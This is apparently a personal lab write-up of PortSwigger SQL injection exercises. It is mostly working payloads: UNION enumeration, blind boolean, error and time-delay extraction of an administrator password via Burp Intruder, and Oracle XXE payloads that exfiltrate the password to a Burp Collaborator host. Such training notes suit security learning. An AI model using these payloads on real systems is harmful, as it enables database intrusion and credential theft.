--# Portswigger
## SQL Injection
### Obtaining Oracle version
```sql

Determine that there are only 2 columns
Acknowledge that in oracle you must select from a specified database. Dual works when querying Oracle via NULL FROM DUAL--

' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--

Determine whether the collumns accept 'strings'
' UNION SELECT 'a','a' FROM DUAL--

If no error code is received continue on querying the version type
Banner seems to be a necessity when querying the version for Oracle. 
The version call is v$version

' UNION SELECT BANNER,NULL FROM v$version--

```

### Obtaining Microsoft, MySQL version
```sql

Determine that there are only 2 columns
In Microsoft, MySQL you must comment & add a space after. T1b3rus recommends adding an 'a' after the space & it seems to work well.

'UNION SELECT NULL,NULL-- a

Determine whether the columns accept 'strings'
'UNION SELECT 'a','a'-- a

If no error code is received continue on querying the version type
The version call is @@version

'UNION SELECT NULL,@@version-- a

```

### Listing the contents of the database
```sql

Microsoft, MySQL
Determine that there are only 2 columns

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

Determine whether the collumns accept 'strings'

' UNION SELECT 'a','a'--

Query the table names 

' UNION SELECT table_name,NULL FROM information_schema.tables-- a

Query the column name called 'users_bxtztu'

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE 
  table_name='users_bxtztu'-- a

Utilize the obtained username/password to query the 'users_bxtztu' table

' UNION SELECT username_aavvzi,password_suvviw FROM users_bxtztu-- a

```

```sql

Oracle
Determine that there are only 2 columns

' UNION SELECT NULL FROM DUAL-- a
' UNION SELECT NULL,NULL FROM DUAL-- a

Determine whether the collumns accept 'strings'

' UNION SELECT 'a','a' FROM DUAL-- a

Query the table names

' UNION SELECT table_name,NULL FROM all_tables-- a

Query the column named 'USERS_WVBYPU'

' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_WVBYPU'-- a

Utilize the obtained username/password to query the 'USERS_WVBYPU' table

' UNION SELECT USERNAME_RZRVZI,PASSWORD_MELTGW FROM USERS_WVBYPU-- a

```

#### SQL injection UNION attack, retrieving multiple values in a single column
```sql

Microsoft, MySQL
Determine that there are only 2 columns

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

Determine whether the collumns accept 'strings'

' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'-- # success

We were told the table name was users and the columns were username and password

' UNION SELECT NULL,username||'~'||password FROM users-- a

```

username: administrator
password: == 20 characters

vblvmng8wt1g1f8e84n5

### Blind SQL injection with conditional responses
```sql

Capture a GET request in burpsuite

GET /filter?category=Tech+gifts HTTP/1.1

Input ' AND '1'='1 (True) and ' AND '1'='2 (False) to determine whether or not you receive confirmation that the website does register this query as true & it should in this case return the "Welcome back!" string while ' ' AND '1'='2 ' does not

Cookie: TrackingId=d4nVvG4ZIAf8sHoR' AND '1'='1; session=irTrHRorcvYubakJpR6zQVSUWccTder9

Verify that there is a username that starts with the letter 'a'

Cookie: TrackingId=d4nVvG4ZIAf8sHoR' AND (SELECT 'a' FROM users LIMIT 1)='a; session=irTrHRorcvYubakJpR6zQVSUWccTder9

Verify that there is a username called 'administator' 
- "Welcome back!" prompt is present

Cookie: TrackingId=d4nVvG4ZIAf8sHoR' AND (SELECT 'a' FROM users WHERE username='administrator')='a; session=irTrHRorcvYubakJpR6zQVSUWccTder9

Verify that the username of 'administrator' has a password length > 1 
- "Welcome back!" prompt is present

Cookie: TrackingId=d4nVvG4ZIAf8sHoR' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a; session=irTrHRorcvYubakJpR6zQVSUWccTder9

At this point to save time manually querying the statement to determine the length of the password instead "send to intruder" 

Go To: Positions
Change password length to = §1§
Cookie: TrackingId=d4nVvG4ZIAf8sHoR' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a; session=irTrHRorcvYubakJpR6zQVSUWccTder9
Go To: Payloads
Payload type: Numbers
test 1 - 25
step 1
Go to: Options
Grep - Match
Clear all current configs
add "welcome back!"
Start attack
Password length == 20

Use the same method via intruder, but instead targeting the password one character at a time. Manually insert a-z & 0-9 into payloads then continue discovering the characters one at a time

Cookie: TrackingId=d4nVvG4ZIAf8sHoR' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§

Cookie: TrackingId=d4nVvG4ZIAf8sHoR' AND (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='§a§

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220501223926.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220501223844.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220501230038.png)

### Blind SQL injection with conditional errors
```sql

Capture a GET request in burpsuite
Followed by inserting a single ' then a double '' (not quite sure the thinking here asides for verifying the responses are different)

GET / HTTP/1.1

Cookie: TrackingId=Mdk7obCFWpvSk7GM'; session=OHkQlyIDgXRKyzCo82WQM7gEC6WpXvfJ
Response:
HTTP/1.1 500 Internal Server Error

Cookie: TrackingId=Mdk7obCFWpvSk7GM''; session=OHkQlyIDgXRKyzCo82WQM7gEC6WpXvfJ
Response:
HTTP/1.1 200 OK

Select no string '' from row number 1 and verify there is a 200 response

Cookie: TrackingId=Mdk7obCFWpvSk7GM'||(SELECT '' FROM users WHERE ROWNUM = 1)||'; session=OHkQlyIDgXRKyzCo82WQM7gEC6WpXvfJ

Determine what type of response you will receive from the following query

Cookie: TrackingId=Mdk7obCFWpvSk7GM'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=OHkQlyIDgXRKyzCo82WQM7gEC6WpXvfJ

HTTP/1.1 500 Internal Server Error

Follow the same process while moving towards determining the length of the password

Cookie: TrackingId=Mdk7obCFWpvSk7GM'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=OHkQlyIDgXRKyzCo82WQM7gEC6WpXvfJ

HTTP/1.1 500 Internal Server Error

"Send to intruder"
Go To: Payloads
Payload type: Numbers
test 1 - 25
step 1
Determine that the password == 20

Systematically determine what each character value is by inserting a payload of a-z and 0-9

Cookie: TrackingId=Mdk7obCFWpvSk7GM'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=OHkQlyIDgXRKyzCo82WQM7gEC6WpXvfJ

Cookie: TrackingId=Mdk7obCFWpvSk7GM'||(SELECT CASE WHEN SUBSTR(password,20,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=OHkQlyIDgXRKyzCo82WQM7gEC6WpXvfJ

rjj3n23uzz98aa3k6wk3

```

### Blind SQL injection with time delays
```sql


Capture a GET request in burpsuite

GET / HTTP/1.1

Verify if you receive a response after 10 seconds to an Oracle database - since 1=1 you should receive a 200 code

Cookie: TrackingId=iJMDuT387lOQOece'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--; session=wp4YLgf6tQr0oiTgwMFRj3HBatqUnMXi
%4
HTTP/1.1 200 OK

Verify there is a username called "administrator"

Cookie: TrackingId=iJMDuT387lOQOece'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=wp4YLgf6tQr0oiTgwMFRj3HBatqUnMXi

HTTP/1.1 200 OK

Determine that the password is > 1

Cookie: TrackingId=iJMDuT387lOQOece'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=wp4YLgf6tQr0oiTgwMFRj3HBatqUnMXi

HTTP/1.1 200 OK - 10 seconds

Determine that the password is = 20

Cookie: TrackingId=iJMDuT387lOQOece'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=wp4YLgf6tQr0oiTgwMFRj3HBatqUnMXi

HTTP/1.1 200 OK - 10 seconds

Verify and verify != 19

Cookie: TrackingId=iJMDuT387lOQOece'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)=19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=wp4YLgf6tQr0oiTgwMFRj3HBatqUnMXi

HTTP/1.1 200 OK - the response should return almost immediately which means it is false


Cluster bomb method or sniper method, but ensure when you click "Start attack" that you choose the "Columns" drop down and add "response received" to determine fluctuations in this column

Cluster bomb

Cookie: TrackingId=iJMDuT387lOQOece'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=wp4YLgf6tQr0oiTgwMFRj3HBatqUnMXi

Sniper

Cookie: TrackingId=DS8JtfvPmQKxK9vS'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=DSkW1tYWHEvDwFQ451eu4IRDARmmsPqG

Cookie: TrackingId=DS8JtfvPmQKxK9vS'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=DSkW1tYWHEvDwFQ451eu4IRDARmmsPqG

5gixgbrrpxnn6h3ackxw

```

### Blind SQL injection with out-of-band interaction
```sql

Refer to "https://portswigger.net/web-security/sql-injection/cheat-sheet" @ "DNS lookup" section & systematically fuzz each database
Oracle original query

SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

Insert a ' and || at the beginning of the query, brackets around the query, and -- at the end of the query

' || 'SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--

Capture a web request
Send to repeater

Burp -> Burp collaborator client
Copy to clipboard
On the professional download page it signifies that the new public server is "oastify.net" not "oastify.com"
During the labs it only recognized the original public server of "burpcollaborator.net"
Paste to notes and adjust accordingly

132p33bsytnd6qycb3mea0kaa1gr4g.oastify.com

Insert the burp collaborator client url into the payload

' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ek2il9eapzirgju0ywq3ui0a016rug.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--

Insert the above payload following the tracking ID cookie prior to the ; then select the payload and URL-encode it with Ctrl+U

Cookie: TrackingId=qGp8Rn1IuqPfABUm'+||+(SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//ek2il9eapzirgju0ywq3ui0a016rug.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual)--; session=kE8Rje38kTGYgwfBfIMSyISEb4D3fTYT

On burp collaborator client click "Poll now" to check the results

```

### Blind SQL injection with out-of-band data exfiltration
```sql

Refer to "https://portswigger.net/web-security/sql-injection/cheat-sheet" @ "DNS lookup with data exfiltration" section & systematically fuzz each database
Oracle original query

SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 

Capture a web request
Send to repeater

Burp -> Burp collaborator client
Copy to clipboard
On the professional download page it signifies that the new public server is "oastify.net" not "oastify.com"
During the labs it only recognized the original public server of "burpcollaborator.net"
Paste to notes and adjust accordingly

132p33bsytnd6qycb3mea0kaa1gr4g.oastify.com

Insert the burp collaborator client url into the payload
Insert ' UNION at the beginning of the query
Insert SELECT password FROM users WHERE username='administrator' in the "SELECT YOUR-QUERY-HERE" section

' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.wbb67dh942uilxap4szl1cp2etkk89.oastify.com/"> %remote;]>'),'/l') FROM dual--

Place in repeater and URL-encode it with Ctrl+U
.oastify.com should work alongsite burpcollaborator.net in this case

Cookie: TrackingId=VJUR2cAGvKxmzcEd'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.wbb67dh942uilxap4szl1cp2etkk89.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

On burp collaborator client click "Poll now" to check the results

Click on Type: "Http" > "Request to collaborator"
The subdomain of your original domain should be the query response in this case the "administrator" password

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220503222915.png)

#hacking
